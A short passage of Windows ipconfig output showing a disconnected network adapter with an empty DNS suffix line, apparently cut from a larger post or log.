   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
